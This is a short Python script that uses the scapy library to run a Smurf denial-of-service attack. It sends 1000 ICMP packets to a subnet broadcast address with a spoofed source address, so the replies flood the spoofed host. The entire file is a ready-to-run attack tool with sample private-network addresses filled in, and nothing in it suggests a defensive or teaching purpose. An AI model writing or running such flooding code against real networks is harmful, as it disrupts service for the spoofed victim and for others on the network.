from scapy.all import *

def smurf_attack(broadcast_ip, spoofed_ip, packet_count):
    icmp_packet = IP(dst=broadcast_ip, src=spoofed_ip)/ICMP()/("X" * 32)
    for i in range(packet_count):
        send(icmp_packet, verbose=False)
        print(f"ICMP {i + 1} send to {broadcast_ip} from {spoofed_ip}")

broadcast_ip = "192.168.1.255"
spoofed_ip = "192.168.1.128"
packet_count = 1000
smurf_attack(broadcast_ip, spoofed_ip, packet_count)
